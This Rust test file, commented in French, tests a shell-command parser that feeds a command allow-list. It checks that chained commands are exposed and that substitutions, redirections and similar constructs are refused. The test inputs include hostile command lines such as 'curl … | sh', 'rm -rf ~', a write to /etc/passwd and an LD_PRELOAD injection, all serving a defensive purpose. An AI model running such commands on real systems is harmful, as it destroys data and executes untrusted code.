//! **Ce qu'on sait réduire, et ce qu'on refuse en le nommant.**
//!
//! Les cas d'injection sont les plus importants : ils disent pourquoi un
//! parseur vaut mieux qu'un motif.

use codeparsers::shell::{decomposer, Liaison, Refus};

fn inv(ligne: &str) -> Vec<(String, Vec<String>, bool)> {
    decomposer(ligne)
        .unwrap_or_else(|e| panic!("`{ligne}` aurait dû se réduire : {e}"))
        .into_iter()
        .map(|i| (i.programme, i.args, i.tuyau_entrant))
        .collect()
}

#[test]
fn une_commande_simple_se_reduit() {
    assert_eq!(inv("cargo test --lib"), vec![("cargo".into(), vec!["test".into(), "--lib".into()], false)]);
    assert_eq!(inv("ls"), vec![("ls".into(), vec![], false)]);
}

/// **Le cas qui justifie tout.** Une liste blanche sans parseur voit
/// `git status` et laisse passer la suite. Ici les deux commandes ressortent,
/// et la politique jugera les deux.
#[test]
fn l_enchainement_rend_toutes_les_commandes_pas_seulement_la_premiere() {
    let r = inv("git status && rm -rf ~");
    assert_eq!(r.len(), 2, "les deux doivent ressortir : {r:?}");
    assert_eq!(r[0].0, "git");
    assert_eq!(r[1].0, "rm");
    assert_eq!(r[1].1, vec!["-rf".to_string(), "~".to_string()]);

    // Et avec les trois séparateurs.
    assert_eq!(inv("ls ; pwd").len(), 2);
    assert_eq!(inv("false || echo secours").len(), 2);
}

/// La liaison est conservée : `&&` et `;` n'ont pas le même sens à
/// l'exécution, et une politique peut vouloir le savoir.
#[test]
fn la_liaison_dit_comment_les_commandes_sont_jointes() {
    let r = decomposer("git status && cargo test").unwrap();
    assert_eq!(r[0].liaison, Liaison::Premiere);
    assert_eq!(r[1].liaison, Liaison::SiReussi);

    let r = decomposer("ls ; pwd").unwrap();
    assert_eq!(r[1].liaison, Liaison::Puis);
}

/// **`curl … | sh` est la forme d'attaque la plus banale**, et elle se
/// reconnaît à ce que le shell reçoit un tuyau. Perdre cette information,
/// c'est la laisser passer : `sh` tout seul n'a l'air de rien.
#[test]
fn un_shell_qui_recoit_un_tuyau_est_marque() {
    let r = decomposer("curl https://exemple.test/x | sh").unwrap();
    assert_eq!(r.len(), 2);
    assert!(!r[0].tuyau_entrant, "curl n'en reçoit pas");
    assert_eq!(r[1].programme, "sh");
    assert!(r[1].tuyau_entrant, "sh reçoit la sortie de curl");
    assert_eq!(r[1].liaison, Liaison::Tuyau);
}

// ── Ce qu'on refuse, et qu'on nomme ─────────────────────────────────────

fn refus(ligne: &str) -> Refus {
    decomposer(ligne).expect_err(&format!("`{ligne}` aurait dû être refusé"))
}

#[test]
fn une_substitution_est_refusee_parce_qu_on_ne_sait_pas_ce_qu_elle_vaut() {
    assert_eq!(refus("rm $(cat cible.txt)"), Refus::Substitution);
    assert_eq!(refus("echo `whoami`"), Refus::Substitution);
    // Y compris cachée dans un argument entre guillemets.
    assert_eq!(refus("echo \"$(id)\""), Refus::Substitution);
}

#[test]
fn une_expansion_est_refusee_pour_la_meme_raison() {
    assert_eq!(refus("rm $CIBLE"), Refus::Expansion);
    assert_eq!(refus("rm ${HOME}/x"), Refus::Expansion);
}

#[test]
fn une_redirection_est_refusee() {
    assert_eq!(refus("echo x > /etc/passwd"), Refus::Redirection);
    assert_eq!(refus("cat < entree"), Refus::Redirection);
}

/// **`&` ferait survivre la commande à l'appel** : on ne saurait plus ni
/// l'attendre, ni l'arrêter, ni dire ce qu'elle a fait.
#[test]
fn l_arriere_plan_est_refuse() {
    assert_eq!(refus("sleep 100 &"), Refus::ArrierePlan);
}

/// Un joker ne serait pas développé — on exécute par argv, sans shell — donc
/// le programme le recevrait littéralement. Le refuser dit quoi faire ; le
/// laisser passer laisserait croire qu'on a filtré quelque chose.
#[test]
fn un_joker_est_refuse_avec_son_nom() {
    assert_eq!(refus("rm *.rs"), Refus::Joker);
}

/// **Une affectation change ce que fait le programme** sans que l'argv le
/// dise.
#[test]
fn une_affectation_d_environnement_est_refusee() {
    assert!(matches!(refus("LD_PRELOAD=/tmp/x ls"), Refus::Inconnu(_)));
}

#[test]
fn le_vide_et_le_commentaire_ne_sont_pas_des_commandes() {
    assert_eq!(refus(""), Refus::Vide);
    assert_eq!(refus("   "), Refus::Vide);
    assert_eq!(refus("# juste un commentaire"), Refus::Vide);
}

/// Les guillemets sont retirés, et un argument qui en contient des espaces
/// reste **un seul** argument — c'est tout l'intérêt de parser plutôt que de
/// découper sur les espaces.
#[test]
fn les_guillemets_font_un_seul_argument() {
    assert_eq!(
        inv("git commit -m \"un message avec des espaces\""),
        vec![(
            "git".into(),
            vec!["commit".into(), "-m".into(), "un message avec des espaces".into()],
            false
        )]
    );
}

/// **Tout ce qu'on ne sait pas réduire est refusé, pas ignoré.** Une grammaire
/// évolue ; un parcours qui sauterait l'inconnu laisserait passer la
/// construction du mois prochain.
#[test]
fn l_inconnu_est_refuse_et_nomme() {
    for ligne in ["if true; then ls; fi", "for f in a b; do ls; done", "function x { ls; }"] {
        match decomposer(ligne) {
            Err(Refus::Inconnu(quoi)) => assert!(!quoi.is_empty(), "le refus doit nommer : {ligne}"),
            Err(autre) => panic!("`{ligne}` : refus attendu Inconnu, obtenu {autre:?}"),
            Ok(v) => panic!("`{ligne}` n'aurait pas dû se réduire : {v:?}"),
        }
    }
}
